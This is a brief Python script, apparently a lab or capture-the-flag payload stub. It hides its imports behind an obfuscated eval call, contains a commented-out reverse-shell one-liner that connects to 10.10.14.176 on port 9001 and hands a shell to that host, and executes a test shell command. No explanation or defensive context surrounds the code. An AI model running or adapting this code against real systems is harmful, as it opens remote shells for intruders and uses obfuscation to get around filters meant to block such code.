#!/usr/bin/env python3

load_module = eval('__im' + 'port__')

os = load_module('os')
pty = load_module('pty')
socket = load_module('socket')

# s=socket.socket();s.connect(("10.10.14.176",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
os.system('bash -c "ls"')
